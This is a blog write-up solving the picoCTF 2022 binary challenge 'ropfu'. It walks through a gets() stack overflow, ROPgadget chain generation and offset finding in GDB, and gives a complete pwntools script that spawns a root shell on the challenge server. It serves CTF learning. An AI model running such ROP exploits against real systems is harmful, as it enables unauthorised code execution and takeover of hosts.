---
title: "pico22/pwn: ropfu"
date: 2022-06-14 19:20:05
categories:
- ctfs
- pico22
- pwn
tags:
- pwn
- rop-chain
description: "Utilize the ROPgadget tool to carry your classic return-oriented programming challenges! This is my writeup for the picoCTF 2022 pwn/binary challenge \"ropfu\"."
permalink: ctfs/pico22/pwn/ropfu/
thumbnail: https://enscribe.dev/asset/banner/banner-ropfu.png
---

{% fontawesome %}

{% challenge %}
authors: Sanjay C., Lt. "Syreal" Jones
solvers: enscribe
files: [vuln](/asset/pico22/ropfu/vuln), [vuln.c](/asset/pico22/ropfu/vuln.c)
description: What's ROP?<br>Can you exploit the following [program](/asset/pico22/ropfu/vuln) to get the flag? Download [source](/asset/pico22/ropfu/vuln.c).<br>`nc saturn.picoctf.net [PORT]`
size: 110%
hint: This is a classic ROP to get a shell
{% endchallenge %}

{% warning %}
Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.{% endwarning %}

{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
<span style="color:#F99157">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#5EBDAB">Canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
{% endccb %}

Hey, look: a classic "ROP" (return-oriented programming) challenge with the source code provided! Let's take a look:

{% ccb lang:c caption:vuln.c gutter1:1-10,,11-23 url:'enscribe.dev/asset/pico22/ropfu/vuln.c' url_text:'download source' wrapped:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#define BUFSIZE 16

void vuln() {
    char buf[16];
    printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
    return gets(buf);

}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    // Set the gid to the effective gid
    // this prevents /bin/sh from dropping the privileges
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    vuln();
}

{% endccb %}

The source only provides us with one vulnerable function: `gets()`. I've gone over this extremely unsafe function multiple times now, so feel free to read [MITRE's Common Weakness Enumeration page](https://cwe.mitre.org/data/definitions/242.html) if you don't know why. There is also no convenient function with `execve("/bin/sh", 0, 0)` in it (for obvious reasons), so we will have to insert our own shellcode.

Although we could totally solve this the old-fashioned way (as John Hammond did in [his writeup](https://www.youtube.com/watch?v=c7wNN8qgxAA)), we can use the power of automation with a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)! Let's try using it here to **automatically** build the ROP-chain for us, which will eventually lead to a [syscall](https://en.wikipedia.org/wiki/System_call):

{% ccb html:true caption:'auto rop-chain generation' url:'github.com/JonathanSalwan/ROPgadget' url_text:'github link' scrollable:true %}
<span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span>

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret

- Step 4 -- Syscall gadget

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80

- Step 5 -- Build the ROP chain
<div class="skip-highlight">(omitted for brevity, will be in final script!)</div>
{% endccb %}

Oh, wow. It generated the entire script for us (unfortunately in Python2), with only a few missing bits and bobs! The only things we need to manually configure now are the offset and remote connection. Since the `checksec` mentioned that there was a canary enabled, it looks like we'll have to manually guess the offset with the `$eip`:

{% ccb html:true caption:'GDB - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master' url_text:documentation %}
<span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
>>> print('A'*28 + 'B'*4)
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
>>> 
<span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/ropfu/vuln 
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x42424242</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: <span style="color:#9755B3">0xffffd540</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span>
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#D41919">0x80e5300</span>  →  <span style="color:#585858"><b><_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah</b></span>
<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$esi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x42424242 ("<span style="color:#FEA44C">BBBB</span>"?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x42424242
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x42424242</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
{% endccb %}

The offset is 28, as we've successfully loaded 4 hex `B`s into the `$eip`. Our last step is to set up the remote connection with [pwntools](https://docs.pwntools.com/en/stable/). Here is my final script:

{% ccb lang:py gutter1:1-48 caption:ropfu.py url:gist.github.com/jktrn/17d531a5738b4592f6d718fc0eb1b508 url_text:'github gist link' %}
#!/usr/bin/env python2
from pwn import *
from struct import pack

payload = 'A'*28

payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5064) # @ .data + 4
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x08049022) # pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x08049e39) # pop ecx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080e5060) # padding without overwrite ebx
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0804a3d2) # int 0x80

p = remote("saturn.picoctf.net", [PORT])
log.info(p.recvS())
p.sendline(payload)
p.interactive()
{% endccb %}

Let's run the script:

{% ccb html:true %}
<span style="color:#F99157">$ </span> python2 exp.py
<pre>python2 exp.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 58931: Done
[<span style="color:#277FFF"><b>*</b></span>] How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
<span style="color:#EC0101"><b>$</b></span> whoami
root
<span style="color:#EC0101"><b>$</b></span> ls
flag.txt
vuln
<span style="color:#EC0101"><b>$</b></span> cat flag.txt
picoCTF{5n47ch_7h3_5h311_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> <span style="background-color:#FFFFFF"><span style="color:#1A1C23"> </span></span>
{% endccb %}

I know the way of ROP-fu, old man. Your shell has been snatched.

{% flagcounter %}